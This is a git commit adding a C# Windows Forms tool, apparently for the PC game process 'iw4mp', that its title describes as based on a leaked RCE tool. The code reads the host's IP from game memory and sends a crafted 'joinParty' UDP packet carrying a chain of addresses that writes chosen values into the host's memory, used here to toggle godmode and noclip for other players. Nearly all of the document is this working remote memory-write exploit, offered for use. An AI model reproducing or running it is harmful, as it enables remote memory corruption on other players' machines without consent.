e98763aeb6cbedec69289b4a1f7d44112471a007
John <John@BLASTSALT>
2019-12-11 09:37:22 +0000

    Push

---
+++ Blasts_Test/Form1.Designer.cs
@@ -0,0 +1,176 @@
+﻿namespace Blasts_Test
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.button4 = new System.Windows.Forms.Button();
+            this.button5 = new System.Windows.Forms.Button();
+            this.button6 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.groupBox1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.Location = new System.Drawing.Point(583, 7);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(205, 407);
+            this.listBox1.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(583, 420);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(205, 23);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Get Clients";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.button4);
+            this.groupBox1.Controls.Add(this.button5);
+            this.groupBox1.Controls.Add(this.button3);
+            this.groupBox1.Controls.Add(this.button2);
+            this.groupBox1.Location = new System.Drawing.Point(12, 12);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(207, 80);
+            this.groupBox1.TabIndex = 2;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Client Options";
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(6, 19);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(95, 23);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "Godmode ON";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(107, 19);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(95, 23);
+            this.button3.TabIndex = 4;
+            this.button3.Text = "Godmode OFF";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // button4
+            // 
+            this.button4.Location = new System.Drawing.Point(107, 48);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(95, 23);
+            this.button4.TabIndex = 6;
+            this.button4.Text = "NoClip OFF";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // button5
+            // 
+            this.button5.Location = new System.Drawing.Point(6, 48);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(95, 23);
+            this.button5.TabIndex = 5;
+            this.button5.Text = "NoClip ON";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // button6
+            // 
+            this.button6.Location = new System.Drawing.Point(11, 386);
+            this.button6.Name = "button6";
+            this.button6.Size = new System.Drawing.Size(207, 23);
+            this.button6.TabIndex = 7;
+            this.button6.Text = "Click me for source (github)";
+            this.button6.UseVisualStyleBackColor = true;
+            this.button6.Click += new System.EventHandler(this.button6_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(9, 412);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(191, 13);
+            this.label1.TabIndex = 8;
+            this.label1.Text = "Credits to Gamer7112 for finding exploit";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(9, 430);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(331, 13);
+            this.label2.TabIndex = 9;
+            this.label2.Text = "Credits to AssumingAgate for stealing packet from XBOX360LSBEST";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button6);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.listBox1);
+            this.Name = "Form1";
+            this.Text = "BlastsMods\' Tool (Based off of Leaked RCE Tool)";
+            this.groupBox1.ResumeLayout(false);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ListBox listBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.Button button5;
+        private System.Windows.Forms.Button button6;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+    }
+}
+
---
+++ Blasts_Test/Form1.cs
@@ -0,0 +1,153 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Threading;
+using System.Net.Sockets;
+
+namespace Blasts_Test
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        [DllImport("kernel32.dll")]
+        public static extern bool ReadProcessMemory(int hProcess, UInt32 lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
+
+        private byte[] GetBytes(string ModuleName, UInt32 Address, int Length)
+        {
+            byte[] buffer = new byte[Length];
+
+            foreach (Process mod in Process.GetProcesses())
+            {
+                if (mod.ProcessName == ModuleName)
+                {
+                    ReadProcessMemory((int)mod.Handle, Address, buffer, Length, ref Length);
+                }
+            }
+
+            return buffer;
+        }
+
+        public byte[] ReadBytes(string ModuleName, UInt32 offset, int length)
+        {
+            byte[] buffer = GetBytes(ModuleName, offset, length);
+            return buffer;
+        }
+
+        public string ReadString(string ModuleName, int offset)
+        {
+            int blocksize = 40;
+            int scalesize = 0;
+            string str = string.Empty;
+
+            while (!str.Contains('\0'))
+            {
+                byte[] buffer = ReadBytes(ModuleName, (uint)offset + (uint)scalesize, blocksize);
+                str += Encoding.UTF8.GetString(buffer);
+                scalesize += blocksize;
+            }
+
+            return str.Substring(0, str.IndexOf('\0'));
+        }
+
+        public uint getPlayerstate(uint client)
+        {
+            return 0x01B0E1C0 + (client * 0x366C);
+        }
+
+        public uint getEntity(uint client)
+        {
+            return 0x0194B9D0 + (client * 0x274);
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            listBox1.Items.Clear();
+            for (int i = 0; i < 18; i++)
+            {
+                listBox1.Items.Add(ReadString("iw4mp", 0x10F9362 + (0xE0 * i)));
+            }
+        }
+
+        private void Send(string IP, ushort Port, byte[] Data)
+        {
+            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+
+            IPAddress serverAddr = IPAddress.Parse(IP);
+
+            IPEndPoint endPoint = new IPEndPoint(serverAddr, Port);
+
+            sock.SendTo(Data, endPoint);
+
+            sock.Close();
+        }
+
+        public static string ConvertIP(byte[] input, string spacer)
+        {
+            string str = string.Empty;
+            for (int i = 0; i < 4; ++i)
+            {
+                Decimal num = Convert.ToDecimal(input[i]);
+                str = i == 3 ? str + Convert.ToString(num) : str + Convert.ToString(num) + spacer;
+            }
+            return str;
+        }
+
+        public void WriteUInt(uint Address, uint Value)
+        {
+            string exp = "ÿÿÿÿ1joinParty 149 1 1 0 0 0 32 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 4273664 28882928 6706537 0 4198910 4273664 " + (uint)(Address - 0x14) + " 6706537 " + (uint)Value + " 4198910 5677570";
+
+            byte[] HostIP = ReadBytes("iw4mp", 0xAF6028, 4); //Grab Host's IP from NetChan
+            string HostIPString = ConvertIP(HostIP, "."); //Convert IP to string and format it correctly
+
+            byte[] Packet = Encoding.ASCII.GetBytes(exp); //Convert string to byte array
+
+            Buffer.BlockCopy(BitConverter.GetBytes(0xFFFFFFFF), 0, Packet, 0, 4); //Overwrite first 4 bytes to specify connectionless packet, idk why but ascii conversion fails
+
+            //Send Packet
+            Send(HostIPString, 28960, Packet);
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            uint SelectedClient = (uint)listBox1.SelectedIndex;
+            WriteUInt(getEntity(SelectedClient) + 0x184, 1);
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            uint SelectedClient = (uint)listBox1.SelectedIndex;
+            WriteUInt(getEntity(SelectedClient) + 0x184, 0);
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            uint SelectedClient = (uint)listBox1.SelectedIndex;
+            WriteUInt(getPlayerstate(SelectedClient) + 0x3394, 1);
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            uint SelectedClient = (uint)listBox1.SelectedIndex;
+            WriteUInt(getPlayerstate(SelectedClient) + 0x3394, 0);
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("https://github.com/BlastsMods/JoinPartyRCE");
+        }
+    }
+}
